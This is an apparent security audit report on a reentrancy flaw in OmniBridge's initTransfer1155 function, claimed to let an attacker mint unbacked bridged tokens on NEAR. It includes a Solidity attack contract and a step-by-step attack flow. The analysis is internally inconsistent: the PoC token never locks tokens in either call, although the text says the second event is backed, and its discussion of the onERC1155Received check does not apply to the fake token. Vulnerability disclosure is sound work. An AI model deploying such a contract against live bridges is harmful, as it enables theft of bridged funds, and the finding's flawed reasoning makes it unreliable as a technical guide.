### Title
ERC1155 `safeTransferFrom` Callback Enables Reentrancy in `initTransfer1155`, Allowing Unauthorized Token Minting on NEAR - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` increments `currentOriginNonce` before making an external `safeTransferFrom` call to an attacker-controlled ERC1155 token. Because ERC1155's `safeTransferFrom` triggers `onERC1155Received` callbacks, a malicious ERC1155 token can reenter `initTransfer1155` during the transfer. The outer call then reads the already-modified `currentOriginNonce` when emitting `InitTransfer`, causing two events to share the same nonce — one fraudulent (no tokens locked) and one valid. The NEAR side processes the fraudulent event first and mints tokens without any EVM collateral being held.

---

### Finding Description

In `initTransfer1155`:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;                    // (1) nonce incremented to N

    address deterministicToken = deriveDeterministicAddress(tokenAddress, tokenId);

    IERC1155(tokenAddress).safeTransferFrom(    // (2) external call — triggers onERC1155Received
        msg.sender,
        address(this),
        tokenId,
        amount,
        ""
    );

    // ...
    emit BridgeTypes.InitTransfer(
        msg.sender,
        deterministicToken,
        currentOriginNonce,                     // (3) reads currentOriginNonce AFTER external call
        ...
    );
}
``` [1](#0-0) 

The nonce is incremented at step (1), but `currentOriginNonce` is read again at step (3) after the external call. A malicious ERC1155 token can reenter `initTransfer1155` during step (2), incrementing the nonce to N+1 and emitting `InitTransfer(nonce=N+1)` without locking tokens. When control returns to the outer call, it also reads `currentOriginNonce = N+1` and emits a second `InitTransfer(nonce=N+1)` — this time with tokens locked. The NEAR side sees the fraudulent event first (emitted during reentrancy), mints tokens, then rejects the valid event as a duplicate nonce.

There is no `nonReentrant` guard on `initTransfer1155`, and `logMetadata1155` is permissionless, so any attacker can register a malicious ERC1155 token. [2](#0-1) 

The bridge's `onERC1155Received` only checks `operator != address(this)`. Since the bridge itself calls `safeTransferFrom`, the ERC1155 contract sets `operator = address(bridge)`, so the check passes — the callback is accepted even from a malicious token. [2](#0-1) 

The security invariant documented in `evm/CLAUDE.md` is violated:

> **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held. [3](#0-2) 

---

### Impact Explanation

The NEAR bridge treats any `InitTransfer` event emitted by the registered EVM factory as proof that tokens are held. A fraudulent event with a valid nonce causes the NEAR side to mint bridged tokens with no EVM collateral locked. This is an unauthorized minting / loss of bridged funds — a critical impact.

---

### Likelihood Explanation

- `logMetadata1155` is permissionless: any attacker can register a malicious ERC1155 token on-chain.
- No reentrancy guard exists on `initTransfer1155`.
- The ERC1155 standard mandates `safeTransferFrom` call `onERC1155Received`, making the callback path unavoidable.
- The attacker needs only to deploy a malicious ERC1155 contract and call two public functions (`logMetadata1155`, `initTransfer1155`).

---

### Recommendation

1. **Cache the nonce before the external call** and use the cached value in the event emission:
   ```solidity
   uint64 nonce = ++currentOriginNonce;
   // ... external call ...
   emit BridgeTypes.InitTransfer(msg.sender, deterministicToken, nonce, ...);
   ```
2. **Add a `nonReentrant` modifier** (OpenZeppelin `ReentrancyGuardUpgradeable`) to `initTransfer1155`.
3. **Verify token receipt** by checking the bridge's ERC1155 balance before and after `safeTransferFrom`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress, uint256 tokenId, uint128 amount,
        uint128 fee, uint128 nativeFee, string calldata recipient, string calldata message
    ) external payable;
    function logMetadata1155(address tokenAddress, uint256 tokenId) external;
}

contract MaliciousERC1155 {
    IOmniBridge bridge;
    uint256 public depth;
    uint256 constant TOKEN_ID = 1;

    constructor(address _bridge) { bridge = IOmniBridge(_bridge); }

    // Fake ERC1155 interface
    function safeTransferFrom(address, address, uint256, uint256, bytes calldata) external {
        depth++;
        if (depth == 1) {
            // Reenter: inner call does NOT transfer tokens (depth==2 path)
            bridge.initTransfer1155(address(this), TOKEN_ID, 100, 0, 0, "attacker.near", "");
            // Outer call: tokens "transferred" (do nothing, just return)
        }
        // depth==2: do nothing — no tokens transferred, no revert
        depth--;
    }

    // Minimal ERC1155 stubs
    function balanceOf(address, uint256) external pure returns (uint256) { return 1000; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }

    function attack() external {
        bridge.logMetadata1155(address(this), TOKEN_ID);
        // Outer call: nonce=N, reenters → inner emits InitTransfer(N+1, no tokens locked)
        // Outer then emits InitTransfer(N+1, tokens "locked") — same nonce, rejected by NEAR
        // NEAR processes fraudulent inner event first → free mint
        bridge.initTransfer1155(address(this), TOKEN_ID, 100, 0, 0, "attacker.near", "");
    }
}
```

Attack flow:
1. Deploy `MaliciousERC1155` pointing at the bridge.
2. Call `attack()`.
3. Outer `initTransfer1155` increments nonce to N, calls `safeTransferFrom` (depth=1).
4. Malicious token reenters `initTransfer1155` (depth=2): nonce becomes N+1, inner `safeTransferFrom` (depth=2) does nothing, inner call emits `InitTransfer(nonce=N+1)` — no tokens locked.
5. Returns to outer call: outer emits `InitTransfer(nonce=N+1)` — same nonce.
6. NEAR processes the first `InitTransfer(N+1)` (fraudulent) → mints tokens to `attacker.near`.
7. NEAR rejects the second `InitTransfer(N+1)` as duplicate nonce.
8. Attacker receives bridged tokens on NEAR with no EVM collateral held.

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L447-490)
```text
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** evm/CLAUDE.md (L36-36)
```markdown
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```
